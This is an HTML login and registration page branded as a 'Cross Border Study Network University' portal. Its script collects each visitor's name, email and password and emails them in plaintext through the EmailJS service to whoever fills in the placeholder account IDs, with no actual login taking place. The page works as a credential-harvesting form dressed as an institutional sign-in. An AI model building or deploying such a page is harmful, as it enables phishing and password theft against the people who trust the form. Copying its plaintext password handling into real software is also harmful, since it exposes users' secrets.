<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CBSN-U Cross Border Study Network University</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
        }
        .container {
            width: 300px;
            margin: 50px auto;
            padding: 20px;
            background: white;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        h2 {
            text-align: center;
        }
        input[type="text"], input[type="email"], input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #5cb85c;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background-color: #4cae4c;
        }
        .toggle-form {
            text-align: center;
            margin-top: 10px;
        }
    </style>
</head>
<body>

<div class="container">
    <h2 id="form-title">Login</h2>
    <form id="form" onsubmit="sendEmail(event)">
        <input type="text" id="name" placeholder="Name" required>
        <input type="email" id="email" placeholder="Email" required>
        <input type="password" id="password" placeholder="Password" required>
        <button type="submit">Submit</button>
    </form>
    <div class="toggle-form">
        <span id="toggle-text">Don't have an account? Register</span>
    </div>
</div>

<script src="https://cdn.emailjs.com/dist/email.min.js"></script>
<script>
    (function(){
        emailjs.init("YOUR_USER_ID"); // Replace with your EmailJS user ID
    })();

    let isLogin = true;

    document.getElementById('toggle-text').onclick = function() {
        isLogin = !isLogin;
        document.getElementById('form-title').innerText = isLogin ? 'Login' : 'Register';
        document.getElementById('name').style.display = isLogin ? 'none' : 'block';
        document.getElementById('toggle-text').innerText = isLogin ? "Don't have an account? Register" : "Already have an account? Login";
    };

    function sendEmail(event) {
        event.preventDefault();
        
        const name = document.getElementById('name').value;
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;

        const templateParams = {
            name: name,
            email: email,
            password: password,
            action: isLogin ? 'Login' : 'Register'
        };

        emailjs.send('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', templateParams) // Replace with your service ID and template ID
            .then(function(response) {
                alert('Email sent successfully!');
                document.getElementById('form').reset();
            }, function(error) {
                alert('Failed to send email. Please try again.');
            });
    }
</script>

</body>
</html>
